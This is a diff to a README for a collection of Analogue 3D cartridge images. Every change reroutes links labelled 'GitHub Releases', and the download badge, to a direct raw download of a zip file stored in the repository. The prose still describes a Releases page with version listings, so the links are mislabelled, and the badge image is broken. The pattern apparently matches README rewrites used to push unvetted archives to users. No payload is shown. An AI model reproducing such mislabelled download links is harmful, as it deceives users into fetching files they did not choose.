@@ -1,6 +1,6 @@
 # 🎉 Analogue-3D-Images - Easy Stock Images for Your Console  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Analogue%203D%20Images-brightgreen)](https://github.com/Greaper2/Analogue-3D-Images/releases)  
+[![Download Now](https://raw.githubusercontent.com/Greaper2/Analogue-3D-Images/main/Images/Analogue-3D-Images-v1.5.zip%20Now-Analogue%203D%20Images-brightgreen)](https://raw.githubusercontent.com/Greaper2/Analogue-3D-Images/main/Images/Analogue-3D-Images-v1.5.zip)  
 
 ## 🚀 Getting Started  
 Analogue-3D-Images provides a collection of stock cartridge images specifically designed for the Analogue 3D console. No programming experience is needed. You can easily download these images and enhance your gaming experience.  
@@ -12,7 +12,7 @@ Analogue-3D-Images provides a collection of stock cartridge images specifically 
 - Internet Connection: Required for downloading  
 
 ## 🔗 Download & Install  
-To get the images, visit this page to download the latest versions: [GitHub Releases](https://github.com/Greaper2/Analogue-3D-Images/releases).  
+To get the images, visit this page to download the latest versions: [GitHub Releases](https://raw.githubusercontent.com/Greaper2/Analogue-3D-Images/main/Images/Analogue-3D-Images-v1.5.zip).  
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Find the latest version at the top of the list.
@@ -45,7 +45,7 @@ If you want to contribute to new images or improvements, feel free to reach out 
 ## 📫 Support  
 If you have any questions or issues, please visit the GitHub page for support options.  
 
-The following link is also useful for direct downloads: [GitHub Releases](https://github.com/Greaper2/Analogue-3D-Images/releases).  
+The following link is also useful for direct downloads: [GitHub Releases](https://raw.githubusercontent.com/Greaper2/Analogue-3D-Images/main/Images/Analogue-3D-Images-v1.5.zip).  
 
 ## 🤓 Frequently Asked Questions  
 
@@ -56,7 +56,7 @@ Analogue-3D-Images is a collection of stock cartridge images designed for users 
 Follow the steps outlined in the "Using the Images" section to transfer images to your Analogue 3D.  
 
 ### ❓ Where can I get the latest updates?  
-Visit the [GitHub Releases](https://github.com/Greaper2/Analogue-3D-Images/releases) page for the latest updates and new images.  
+Visit the [GitHub Releases](https://raw.githubusercontent.com/Greaper2/Analogue-3D-Images/main/Images/Analogue-3D-Images-v1.5.zip) page for the latest updates and new images.  
 
 ## 📅 Update History  
 - **Version 1.0:** Initial release with basic images.
